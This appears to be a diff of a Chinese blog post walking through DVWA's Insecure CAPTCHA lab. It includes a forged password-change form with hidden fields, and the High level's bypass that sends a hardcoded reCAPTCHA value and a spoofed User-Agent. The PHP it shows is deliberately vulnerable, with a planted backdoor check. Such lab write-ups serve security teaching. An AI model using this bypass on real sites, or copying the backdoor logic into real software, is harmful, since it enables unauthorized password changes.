+            &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;777&quot;&gt;
+
+             &lt;input type=&quot;hidden&quot; name=&quot;passed_captcha&quot; value=&quot;true&quot;&gt;
+
+            &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;&gt;   
+
+            &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;        
+
+        &lt;/form&gt;        
+
+    &lt;/div&gt;        
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
 <p>修改完代码，重新访问，密码再次成功更改</p>
 <h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">	$hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">	$resp = recaptcha_check_answer(</span><br><span class="line">		$_DVWA[ <span class="string">'recaptcha_private_key'</span> ],</span><br><span class="line">		$_POST[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (</span><br><span class="line">		$resp || </span><br><span class="line">		(</span><br><span class="line">			$_POST[ <span class="string">'g-recaptcha-response'</span> ] == <span class="string">'hidd3n_valu3'</span></span><br><span class="line">			&amp;&amp; $_SERVER[ <span class="string">'HTTP_USER_AGENT'</span> ] == <span class="string">'reCAPTCHA'</span></span><br><span class="line">		)</span><br><span class="line">	)&#123;</span><br><span class="line">		<span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">		<span class="keyword">if</span> ($pass_new == $pass_conf) &#123;</span><br><span class="line">			$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">			$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Update database</span></span><br><span class="line">			$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"' LIMIT 1;"</span>;</span><br><span class="line">			$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Feedback for user</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Ops. Password mismatch</span></span><br><span class="line">			$html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;</span><br><span class="line">			$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">		$html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+if( isset( $_POST[ &#39;Change&#39; ] ) ) {
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+
+    // Check CAPTCHA from 3rd party
+    $resp = recaptcha_check_answer(
+        $_DVWA[ &#39;recaptcha_private_key&#39; ],
+        $_POST[&#39;g-recaptcha-response&#39;]
+    );
+
+    if (
+        $resp || 
+        (
+            $_POST[ &#39;g-recaptcha-response&#39; ] == &#39;hidd3n_valu3&#39;
+            &amp;&amp; $_SERVER[ &#39;HTTP_USER_AGENT&#39; ] == &#39;reCAPTCHA&#39;
+        )
+    ){
+        // CAPTCHA was correct. Do both new passwords match?
+        if ($pass_new == $pass_conf) {
+            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+            $pass_new = md5( $pass_new );
+
+            // Update database
+            $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;;
+            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+
+            // Feedback for user
+            $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+
+        } else {
+            // Ops. Password mismatch
+            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;
+            $hide_form = false;
+        }
+
+    } else {
+        // What happens when the CAPTCHA was entered incorrectly
+        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+        return;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+</code></pre>
 <p>本难度取消了<code>step</code>参数的判断，而多了以下的判断</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$resp || ($_POST[ <span class="string">'g-recaptcha-response'</span> ] == <span class="string">'hidd3n_valu3'</span>&amp;&amp; $_SERVER[ <span class="string">'HTTP_USER_AGENT'</span> ] == <span class="string">'reCAPTCHA'</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$resp || ($_POST[ &#39;g-recaptcha-response&#39; ] == &#39;hidd3n_valu3&#39;&amp;&amp; $_SERVER[ &#39;HTTP_USER_AGENT&#39; ] == &#39;reCAPTCHA&#39;)
+</code></pre>
 <p>只有符合以上条件才能进入修改密码的代码，<code>$resp</code>我们已经确定无法控制，所以现在就从<code>$_POST[ &#39;g-recaptcha-response&#39; ]</code>和<code>$_SERVER[ &#39;HTTP_USER_AGENT&#39; ]</code>入手了。修改一下这两个参数也很简单，抓包修改就可以，如下图</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/6-6.png" alt="6-6"></p>
 <p>重新登录验证一下，密码果然修改成功</p>
 <h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">	$hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_new  = stripslashes( $pass_new );</span><br><span class="line">	$pass_new  = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">	$pass_new  = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">	$pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line">	$pass_conf = stripslashes( $pass_conf );</span><br><span class="line">	$pass_conf = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_conf ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">	$pass_conf = md5( $pass_conf );</span><br><span class="line"></span><br><span class="line">	$pass_curr = $_POST[ <span class="string">'password_current'</span> ];</span><br><span class="line">	$pass_curr = stripslashes( $pass_curr );</span><br><span class="line">	$pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_curr ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">	$pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">	$resp = recaptcha_check_answer(</span><br><span class="line">		$_DVWA[ <span class="string">'recaptcha_private_key'</span> ],</span><br><span class="line">		$_POST[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">	<span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">		<span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Check that the current password is correct</span></span><br><span class="line">		$data = $db-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">		$data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">		$data-&gt;bindParam( <span class="string">':password'</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">		$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Do both new password match and was the current password correct?</span></span><br><span class="line">		<span class="keyword">if</span>( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">			<span class="comment">// Update the database</span></span><br><span class="line">			$data = $db-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> );</span><br><span class="line">			$data-&gt;bindParam( <span class="string">':password'</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">			$data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">			$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Feedback for the end user - success!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Feedback for the end user - failed!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">			$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+if( isset( $_POST[ &#39;Change&#39; ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
+
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_new  = stripslashes( $pass_new );
+    $pass_new  = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass_new  = md5( $pass_new );
+
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+    $pass_conf = stripslashes( $pass_conf );
+    $pass_conf = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_conf ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass_conf = md5( $pass_conf );
+
+    $pass_curr = $_POST[ &#39;password_current&#39; ];
+    $pass_curr = stripslashes( $pass_curr );
+    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass_curr = md5( $pass_curr );
+
+    // Check CAPTCHA from 3rd party
+    $resp = recaptcha_check_answer(
+        $_DVWA[ &#39;recaptcha_private_key&#39; ],
+        $_POST[&#39;g-recaptcha-response&#39;]
+    );
+
+    // Did the CAPTCHA fail?
+    if( !$resp ) {
+        // What happens when the CAPTCHA was entered incorrectly
+        $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+        return;
+    }
+    else {
+        // Check that the current password is correct
+        $data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );
+        $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );
+        $data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );
+        $data-&gt;execute();
+
+        // Do both new password match and was the current password correct?
+        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {
+            // Update the database
+            $data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );
+            $data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );
+            $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );
+            $data-&gt;execute();
+
+            // Feedback for the end user - success!
+            $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+        }
+        else {
+            // Feedback for the end user - failed!
+            $html .= &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;;
+            $hide_form = false;
+        }
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+</code></pre>
 <p>Impossible难度加入了<code>Anti-CSRF token</code>验证，并且防止了sql注入，还要输入原密码才能更改，将更改密码的验证过程巩固地很安全</p>
 <hr>
 <p>参考文章：</p>
